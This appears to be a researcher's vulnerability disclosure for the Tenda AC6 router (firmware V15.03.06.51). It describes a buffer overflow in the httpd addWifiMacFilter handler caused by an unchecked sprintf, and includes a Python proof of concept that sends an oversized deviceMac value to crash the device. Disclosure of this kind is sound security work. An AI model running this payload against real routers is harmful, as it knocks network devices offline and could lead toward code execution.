@@ -1,0 +1,70 @@
+# Information
+
+
+
+Vendor of the products:  Shenzhen Jixiang Tenda Technology Co., Ltd.
+
+Vendor's website:  [Homepage_Tenda Global(English)](https://www.tendacn.com/)
+
+Reported by:   b55t4ck(2640807724@qq.com),Wang JinShuai(3265296623@qq.com)
+
+Affected products: Tenda  AC6
+
+Affected firmware version: v2.0_V15.03.06.51
+
+Firmware download address:  https://www.tendacn.com/material/show/103794
+
+
+
+# Overview
+
+Tenda AC6 is a wireless router from China's Tenda company.
+
+During the analysis of the /bin/httpd binary file, it was discovered that in the addWifiMacFilter function, the parameters deviceId and deviceMac are directly accepted from client data through the websGetVar function without any length validation. This vulnerability allows users to construct overly long strings, causing program crashes and preventing normal operation. Additionally, attackers can craft carefully prepared payloads to achieve arbitrary command execution.
+
+# Vulnerability details
+
+During the analysis of the binary file /bin/httpd in IDA, it was found that the program retrieves values from user input through the webGetVar function, and then calls the sprintf function at line 33 to directly concatenate the user-input deviceMac and deviceId parameters into the mib_value variable. Since mib_value is a fixed-length array and the program lacks input length restrictions, this results in a buffer overflow vulnerability.
+
+![image-20250831175447767](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508311754799.png)
+
+Due to the absence of corresponding symbol tables and the target device, it is not possible to perform deeper debugging using GDB. Otherwise, it would be feasible to construct shellcode or ROP chains to achieve shell access, potentially causing more severe damage.
+
+# POC
+
+```python
+from pwn import *
+import requests
+
+url = "http://192.168.1.100/goform/addWifiMacFilter"
+cookie = {"Cookie": "password=b55t4ck"}
+
+
+data = {
+	"deviceId":b'b55t4ck',
+	"deviceMac":cyclic(1024)
+        }
+
+
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+
+try:
+    response = requests.post(url, cookies=cookie, data=data, headers=headers)
+    response = requests.post(url, cookies=cookie, data=data, headers=headers)
+    print(response.text)
+except requests.exceptions.RequestException as e:
+    print(f"Request failed: {e}")
+
+
+```
+
+# Effect Demonstration
+
+After executing the corresponding Python script, the program exhibits a crash condition, with the final output segment displaying the following
+
+
+
+![image-20250831180054581](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508311800620.png)
